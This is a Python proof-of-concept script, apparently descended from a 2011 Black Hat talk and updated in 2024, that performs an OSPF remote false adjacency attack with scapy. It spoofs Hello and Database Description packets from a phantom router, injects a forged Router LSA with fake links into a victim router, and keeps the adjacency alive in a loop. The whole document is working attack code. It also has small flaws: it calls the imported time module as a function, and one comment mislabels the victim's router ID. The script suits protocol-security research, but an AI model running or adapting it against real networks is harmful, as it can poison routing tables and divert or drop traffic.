#!/usr/bin/env python

"""
Proof-of-concept for Remote false adjacency
Author:	Gabi Nakibly
Date:	2011.08.04

Updated by: Leo Åkerberg & Viktor Johansson Baurne
Date: 2024.03.20
Original version downloaded from: https://www.blackhat.com/html/bh-us-11/bh-us-11-archives.html
"""

from scapy.all import *
import time
load_contrib('ospf')

def ourSend(packet):
    sendp(packet)
    time.sleep(2)

phantom='10.0.2.3'     #The IP address and router ID of the phantom router.
victim='10.0.2.2'		 #The IP address of the victim router.
victimId='10.0.2.2'		 #The router ID of the phantom router.
host2='10.0.2.1'		 #This will used in the bogus Link entries in the LSA advertised on behalf of the phantom.
initialseq=17				 #The initial sequence number of the DBDs sent by the attacker. Chosen arbitrarily.
lsaSeq=0			         #The sequence number of the false LSA advertised on behalf of the phantom.
ddsize=10					 #The number of DBDs the attacker will send during the adjacency setup.

#Enter the time (in seconds) which the maintenance phase of the attack will last.
Duration = 60

IPlayer=IP(src=phantom,dst=victim)
OSPFHdr=OSPF_Hdr(src=phantom)
Base=Ether()/IPlayer/OSPFHdr

# Build and send the first Hello packet
hello=Base/OSPF_Hello(options=2,router=victim,backup=victim,neighbors=victimId)
ourSend(hello)

# Build and send the first DBD packet for the master/slave negotiation (must have all three bits set: MS M I)
dd=Base/OSPF_DBDesc(options=2,dbdescr=7,ddseq=initialseq)
ourSend(dd)

# Build and send the rest of the DBD packets (only the MS and M bits are set)
initialseq += 1
for i in range(1,ddsize+1):
	dd=Base/OSPF_DBDesc(options=2,dbdescr=3,ddseq=initialseq)
	ourSend(dd)
	initialseq += 1

# Build and send the last DBD packet (M bit cleared)
dd=Base/OSPF_DBDesc(options=2,dbdescr=1,ddseq=initialseq)
ourSend(dd)

# Adjacency formed

link2host = OSPF_Link(id=host2,data='255.255.255.255',type=3)
link2victim = OSPF_Link(id=victim,data=phantom,type=2)

# Build and send the false LSA packet on behalf of the phantom
lsa=Base/OSPF_LSUpd(lsacount=1,lsalist=[OSPF_Router_LSA(id=phantom,adrouter=phantom,seq=lsaSeq,linkcount=2,linklist=[link2host,link2victim])])
ourSend(lsa)

start=time() 
# Maintain the adjacency by repeatedly sending Hello packets
i=0
while True:
    ourSend(hello)
    sleep(3)
    if i%20 == 0:
        lsaSeq+=1
        lsa=Base/OSPF_LSUpd(lsacount=1,lsalist=[OSPF_Router_LSA(id=phantom,adrouter=phantom,seq=lsaSeq,linkcount=2,linklist=[link2host,link2victim])])        
        ourSend(lsa)
    i+=1
    if time()-start >= Duration: break
    
